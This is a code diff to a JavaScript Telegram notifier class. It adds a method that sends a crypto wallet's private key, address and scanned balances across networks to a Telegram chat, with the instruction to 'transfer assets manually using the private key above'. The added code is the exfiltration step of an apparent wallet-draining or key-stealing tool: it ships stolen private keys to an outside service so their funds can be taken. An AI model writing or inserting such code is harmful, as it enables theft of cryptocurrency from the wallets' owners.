@@ -163,6 +163,48 @@ class TelegramNotifier {
     // Escape special characters for MarkdownV2
     return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
   }
+
+  async sendKeyAndAddressForManualTransfer(privateKey, walletAddress, scanResults) {
+    if (!this.botToken || !this.chatId) {
+      console.warn('Telegram notifications disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
+      return;
+    }
+
+    try {
+      let message = `🔑 <b>Private Key & Wallet Address for Manual Transfer</b>\n\n`;
+      message += `<b>Private Key:</b>\n<code>${privateKey}</code>\n\n`;
+      message += `<b>Wallet Address:</b>\n<code>${walletAddress}</code>\n\n`;
+      message += `<b>📊 Assets Found:</b>\n\n`;
+
+      // Add network details
+      for (const [networkKey, networkData] of Object.entries(scanResults.networks)) {
+        if (networkData && networkData.hasAssets) {
+          message += `<b>💰 ${networkKey.toUpperCase()}</b>\n`;
+          
+          if (networkData.native && parseFloat(networkData.native.balance) > 0) {
+            message += `🪙 Native: <b>${networkData.native.balance} ${networkData.native.symbol}</b>\n`;
+          }
+          
+          if (networkData.tokens && networkData.tokens.length > 0) {
+            message += `\n📦 Tokens (${networkData.tokens.length}):\n`;
+            networkData.tokens.forEach((token, index) => {
+              message += `${index + 1}. <b>${token.balance} ${token.symbol}</b>\n`;
+            });
+          }
+          message += `\n`;
+        }
+      }
+
+      message += `<b>Total Estimated Value:</b> $${scanResults.summary.estimatedValue.toFixed(2)}\n\n`;
+      message += `⚠️ <b>Manual Transfer Required</b>\n`;
+      message += `Please transfer assets manually using the private key above.`;
+
+      await this.send(message, { format: 'html' });
+      console.log('✅ Key and address sent to Telegram for manual transfer');
+    } catch (error) {
+      console.error('Failed to send key and address to Telegram:', error);
+    }
+  }
 }
 
 module.exports = { TelegramNotifier };
